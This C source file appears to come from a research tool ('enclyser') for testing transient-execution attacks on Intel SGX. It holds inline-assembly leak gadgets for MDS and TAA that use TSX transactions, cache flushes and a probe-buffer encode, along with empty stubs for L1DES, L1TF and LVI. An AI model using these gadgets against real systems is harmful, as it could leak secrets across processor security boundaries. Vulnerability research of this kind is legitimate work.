#include "enclyser/libenclyser/attack.h"

/**
 * @brief the defines and functions that are shared by trusted libraries and untrusted libraries
 * 
 */
#ifdef NAMESPACE_SGX_SHARED

static void l1des_attack(enclyer_attack_t *l1des_attack, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
{
    /** TODO */
}

static void l1tf_attack(enclyer_attack_t *l1tf_attack, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
{
    /** TODO */
}

static void lvi_attack(enclyer_attack_t *lvi_attack, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
{
    /** TODO */
}

static void mds_attack(enclyer_attack_t *mds_attack, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
{
    switch (mds_attack->minor)
    {
    case ATTACK_MINOR_NONE:
        break;
    case ATTACK_MINOR_STABLE:
        asm volatile(
            "mfence\n"
            "clflush (%2)\n"    /** TODO seperate the two parts */
            "xbegin 1f\n" 
            "movzbq 0(%0), %%rax\n"
            "shl $6, %%rax\n"   /** TODO calculate 6 in asm code */
            "movzbq (%%rax, %1), %%rax\n"
            "xabort\n"
            "xend\n"
            "1:\n"
            :
            : "r"(attaking_buffer->buffer), "r"(encoding_buffer->buffer), "r"(attaking_buffer->shadow)
            : "rax");
        break;
    default:
        break;
    }
}

static void taa_attack(enclyer_attack_t *taa_attack, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
{
    switch (taa_attack->minor)
    {
    case ATTACK_MINOR_NONE:
        break;
    case ATTACK_MINOR_STABLE:
        asm volatile(
            "mfence\n"
            "clflush (%2)\n"
            "sfence\n"
            "clflush (%1)\n"    /** TODO seperate the two parts */
            "xbegin 1f\n" 
            "movzbq 0(%0), %%rax\n"
            "shl $6, %%rax\n"   /** TODO calculate 6 in asm code */
            "movzbq (%%rax, %1), %%rax\n"
            "xabort\n"
            "xend\n"
            "1:\n"
            :
            : "r"(attaking_buffer->buffer), "r"(encoding_buffer->buffer), "r"(attaking_buffer->shadow)
            : "rax");
        break;
    default:
        break;
    }
}

void attack(enclyer_attack_t *attack_spec, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
{
    switch (attack_spec->major)
    {
    case ATTACK_MAJOR_NONE:
        break;
    case ATTACK_MAJOR_L1DES:
        l1des_attack(attack_spec, attaking_buffer, encoding_buffer);
        break;
    case ATTACK_MAJOR_L1TF:
        l1tf_attack(attack_spec, attaking_buffer, encoding_buffer);
        break;
    case ATTACK_MAJOR_LVI:
        lvi_attack(attack_spec, attaking_buffer, encoding_buffer);
        break;
    case ATTACK_MAJOR_MDS:
        mds_attack(attack_spec, attaking_buffer, encoding_buffer);
        break;
    case ATTACK_MAJOR_TAA:
        taa_attack(attack_spec, attaking_buffer, encoding_buffer);
        break;
    default:
        break;
    }
}

#endif

/**
 * @brief the defines and functions that are exclusive to trusted libraries
 * 
 */
#ifdef NAMESPACE_SGX_YES

#endif

/**
 * @brief the defines and functions that are exclusive to untrusted libraries
 * 
 */
#ifdef NAMESPACE_SGX_NO

#endif